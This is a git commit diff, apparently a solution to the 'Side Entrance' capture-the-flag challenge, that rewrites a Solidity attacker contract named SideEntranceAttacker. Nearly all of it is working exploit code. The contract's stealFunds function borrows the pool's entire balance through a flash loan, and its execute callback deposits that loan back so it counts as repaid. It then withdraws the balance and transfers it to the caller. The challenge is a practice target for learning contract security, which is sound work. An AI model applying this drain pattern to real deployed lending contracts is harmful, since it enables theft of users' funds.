d8cae0c2f6d86d1c4567adeabf2d0adaa935f749
zaryab2000 <zaryabafser2000@gmail.com>
2021-01-20 19:02:15 +0530

    hacked sideEntrance challenge

--- contracts/side-entrance/SideEntranceAttacker.sol
+++ contracts/side-entrance/SideEntranceAttacker.sol
@@ -7,55 +7,24 @@ interface ISideEntranceLenderPool {
     function withdraw() external;
     function flashLoan(uint256 amount) external ;
 }
-contract SideEntranceAttacker {
 
-    ISideEntranceLenderPool mainLenderPool;
-    address payable public attackerAddress;
-    constructor() public{
-        attackerAddress = msg.sender;
-    }
+contract SideEntranceAttacker {
+    using Address for address payable;
+
+    ISideEntranceLenderPool mainPool;
 
     function  stealFunds(ISideEntranceLenderPool _mainPoolAddress) external{
-        mainLenderPool = _mainPoolAddress;
-        address mainPool = address(_mainPoolAddress);
-        uint256 totalPoolBalance = address(mainPool).balance;
-        bytes memory flashLoanPayload = abi.encodeWithSignature("flashLoan(uint256)",totalPoolBalance);
-        bytes memory withdrawPayload = abi.encodeWithSignature("withdraw()");
-       
-        (bool success, ) = mainPool.call(flashLoanPayload);
-        require (success,"FlashLoan transaction Failed");
-        (bool done, ) = mainPool.call(withdrawPayload);
-        require (done,"withdraw transaction Failed");
-
-        attackerAddress.transfer(totalPoolBalance);
+        mainPool = _mainPoolAddress;
+        mainPool.flashLoan(address(mainPool).balance);
+        mainPool.withdraw();
+        msg.sender.sendValue(address(this).balance);
 
     }
     
     function execute() external payable{
-        mainLenderPool.deposit{value: msg.value}();
+        mainPool.deposit{value:msg.value}();
     }
 
     receive() external payable{}
 }
  
-
-// contract SideEntranceAttacker {
-//     using Address for address payable;
-
-//     ISideEntranceLenderPool mainPool;
-
-//     function  stealFunds(ISideEntranceLenderPool _mainPoolAddress) external{
-//         mainPool = _mainPoolAddress;
-//         mainPool.flashLoan(address(mainPool).balance);
-//         mainPool.withdraw();
-//         msg.sender.sendValue(address(this).balance);
-
-//     }
-    
-//     function execute() external payable{
-//         mainPool.deposit{value:msg.value}();
-//     }
-
-//     receive() external payable{}
-// }
-//  
